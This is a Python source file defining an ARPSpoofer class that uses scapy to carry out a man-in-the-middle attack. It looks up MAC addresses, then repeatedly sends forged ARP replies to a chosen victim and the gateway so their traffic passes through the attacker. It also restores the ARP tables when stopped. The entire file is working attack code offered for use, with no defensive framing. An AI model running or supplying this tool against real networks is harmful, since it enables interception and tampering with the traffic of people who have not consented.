"""arp_spoofer.py - ARP spoofer that performs a man-in-the-middle attack through disguise between chosen two devices."""

import time
import scapy.all as scapy


class ARPSpoofer:
    """Manage ARP spoofing between two selected devices on the network.

    Attributes:
        target_ip (str) - IP address of the targeted device ("victim")
        gateway_ip (str) - IP address of the default gateway in the network
        running (bool) - whether spoofing_thread is currently running or not

    Methods:
        start_spoofing() - Start ARP spoofing by constantly sending forged packets between two devices to trick them.
        stop_spoofing() - Stop ARP spoofing by sending forged packets
                          that will restore network flow to the one before spoofing.
    """

    def __init__(self, target_ip: str, gateway_ip: str):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.running = False

    def get_mac(self, ip_address: str) -> str:
        """Get MAC address of the device in the network that has provided IP address by sending ARP request."""
        # TODO: Fix this ARP highlight thing in scapy.
        # https://stackoverflow.com/questions/63645535/arp-in-scapy-not-working-and-getting-an-error-cannot-find-reference-arp-in-a
        arp_request = scapy.ARP(pdst=ip_address)
        broadcast_frame = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_packet = broadcast_frame / arp_request
        answered = scapy.srp(arp_packet, timeout=1, verbose=False)[0]
        try:
            return answered[0][1].hwsrc
        except IndexError:
            print(f"[-] Error. Could not get a response over the network. "
                  f"The IP address might be invalid or there is a problem with your connection. "
                  f"The program has been stopped.")
            exit()

    def spoof(self, target_ip: str, gateway_ip: str) -> None:
        """Spoof connection between two devices, becoming a man-in-the-middle."""
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=self.get_mac(target_ip), psrc=gateway_ip)
        scapy.send(packet, verbose=False)

    def restore(self, destination_ip: str, source_ip: str) -> None:
        """Restore connection between two devices to its original flow."""
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=self.get_mac(destination_ip),
                           psrc=source_ip, hwsrc=self.get_mac(source_ip))
        scapy.send(packet, count=4, verbose=False)

    def get_default_gateway(self) -> str:
        """Take target's IP address and return the default gateway's IP address based on that (naive approach)."""
        # TODO: Get default gateway by using commands and regex?
        address = self.target_ip.split(".")
        address[3] = "1"
        gateway_ip = ".".join(address)
        print(f"[-] Gateway address was not specified. Using default address ({gateway_ip})")
        return gateway_ip

    def start_spoofing(self) -> None:
        """Start ARP spoofing by constantly sending forged packets between two devices to trick them."""
        sent_packets_count = 0
        self.running = True
        try:
            while self.running:
                self.spoof(self.target_ip, self.gateway_ip)
                self.spoof(self.gateway_ip, self.target_ip)
                sent_packets_count += 2
                # NOTE: Remember that while working on threads,
                # the console output won't be displayed unless in debug mode.
                print(f"[+] Sending 2 packets regularly... Total packets sent: {sent_packets_count}", end="\r")
                time.sleep(2)
        except KeyboardInterrupt:
            print("\n[+] Execution aborted. Restoring ARP tables...")
            self.stop_spoofing()

    def stop_spoofing(self) -> None:
        """Stop ARP spoofing by sending forged packets that will restore network flow to the one before spoofing."""
        self.running = False
        self.restore(self.target_ip, self.gateway_ip)
        self.restore(self.gateway_ip, self.target_ip)
